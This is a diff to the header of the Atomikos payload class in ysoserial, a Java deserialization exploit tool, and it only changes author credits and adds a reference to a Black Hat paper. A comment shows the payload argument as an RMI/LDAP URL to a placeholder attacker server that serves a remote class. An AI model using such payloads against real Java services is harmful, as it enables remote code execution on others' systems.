@@ -24,12 +24,16 @@ import ysoserial.payloads.util.Reflections;
 * - (rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>
 *
 *
-* @author sciccone
+* @author pwntester
+* 	payload added by sciccone
 *
+* This gadget chain was also discovered by pwntester:
+* https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
+* 
 */
 @PayloadTest(harness="ysoserial.test.payloads.JRMPReverseConnectTest")
 @Dependencies( { "com.atomikos:transactions-osgi:4.0.6", "javax.transaction:jta:1.1" } )
-@Authors({ Authors.SCICCONE })
+@Authors({ Authors.PWNTESTER, Authors.SCICCONE })
 public class Atomikos implements ObjectPayload<Object> {
 
 	@Override
